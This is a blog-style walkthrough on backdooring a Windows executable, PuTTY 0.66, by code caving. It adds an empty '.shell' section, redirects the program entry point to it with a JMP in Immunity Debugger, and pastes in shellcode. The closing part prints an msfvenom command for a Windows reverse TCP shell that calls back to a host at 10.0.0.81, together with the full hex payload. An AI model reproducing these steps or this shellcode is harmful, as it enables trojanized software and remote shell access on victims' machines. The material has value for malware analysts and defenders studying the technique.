---
layout: single
title: Code caving & backdooring Windows PE files
---

Code caving is a technique deployed by threat actors to run malicious shellcode without the valid PE space of a regular program. It's a technique where an actor discovered an un-used or non-optimized part of code within a compiled program that they can use for hijacking the execution flow, which can lead to the application executing a malicious shellcode payload.

### Thanks Wikipedia
> A code cave is a series of null bytes in a process's memory. The code cave inside a process's memory is often a reference to a section of the code's script functions that have capacity for the injection of custom instructions. For example, if a script's memory allows for five bytes and only three bytes are used, then the remaining two bytes can be used to add additional code to cript without making significant changes. 

---

This walkthrough will be utilizing an older version of Putty, Putty v0.66, which can be downloaded from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.66.html).

----

We can start by opening up putty.exe within CFF Explorer to view the PE data.

![code caving 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_1.png)

Open up the section headers tab and we need to add a new header, this header will be utilized for malicious purposes. Go to `Section Headers [x]` > Right-click and select `Add Section (Empty Space)`, and adjust the size of the section to 1000 spaces. Then name your new section header. I will be naming it `.shell`. Adding these spaces will allow the program to be sen as a legitimate application instead of just throwing you an error and crashing if you don't have data. This blank data will also be utilized soon.

![code caving 2](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_2.png)

Now we can open up our new binary in Immunity Debugger. If you run the application it will show "Program entry point" on the bottom left of Immunity, this is what we want to hijack to point to our soon to be malicious `.shell` segment.

![code caving 3](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_3.png)

From here you copy the `.shell` section headers address and edit the Program entry point to a `JMP <SECTION ADDRESS>`. 

![code caving 4](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_4.png)

![code caving 5](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_5.png)

Now you can press `F7` and step into the newly edited JMP call, this will lead to our new section we created.

![code caving 6](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_6.png)

Now you also want to edit the new section in Immunity and add a `PUSHFD` to the start of your malicious new section. Assemble it when done.

Now you can generate your msfvenom payload, use a EXITFUN=seh to ensure it handles proper exiting to add to the stability and reliability of your shell. Generate it in hex format you you can now copy past this into Immunity Debugger into your new malicious section.

```
└─▪ ./msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.81 LPORT=9999 -f hex EXITFUNC=seh
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hex file: 648 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b5
92001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b6159
5a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976
a05680a000051680200270f89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c74424
3c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbfe0e32ea68a695bd9dffd53c067c0a80fbe07
505bb4713726f6a0053ffd5
```


----
